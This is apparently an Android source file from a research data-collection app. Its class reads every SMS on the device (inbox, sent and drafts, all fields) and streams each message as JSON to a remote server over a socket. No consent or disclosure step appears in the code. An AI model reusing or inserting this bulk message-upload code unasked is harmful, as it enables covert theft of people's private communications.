package edu.real.async.android;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SMSSenderThread extends SenderThread {

    public SMSSenderThread(Context _ctx, String device_id) {
        super(_ctx, device_id);
    }

    protected void send() {
        // Refs: https://stackoverflow.com/questions/848728/how-can-i-read-sms-messages-from-the-device-programmatically-in-android/32153303
        // public static final String INBOX = "content://sms/inbox";
        // public static final String SENT = "content://sms/sent";
        // public static final String DRAFT = "content://sms/draft";
        Cursor cursor = ctx.getContentResolver().query(
                Uri.parse("content://sms"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent
                                    // exception
            do {
                JSONObject o_sms = new JSONObject();
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    try {
                        o_sms.put(cursor.getColumnName(idx),
                                cursor.getString(idx));
                    } catch (JSONException e) {
                        Log.e("sms-send", "Putting to JSONObject failed. "
                                + e.getMessage());
                        o_sms = null;
                        break;
                    }
                }
                if (o_sms == null) {
                    continue;
                }
                sOut.println("S" + o_sms.toString());
                String resp;
                try {
                    resp = sIn.readLine();
                } catch (IOException e) {
                    Log.e("sms-send", "Server response reading failed. "
                            + e.getMessage());
                    working = false;
                    break;
                }
                if (resp == null) {
                    Log.e("sms-send",
                            "Server responsed nothing after SMS sent. "
                            + resp);
                    working = false;
                    break;
                }
                if (!resp.equals("s")) {
                    Log.e("sms-send",
                            "Unexpected server response after SMS sent. "
                            + resp);
                    working = false;
                    break;
                }
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
    }
}
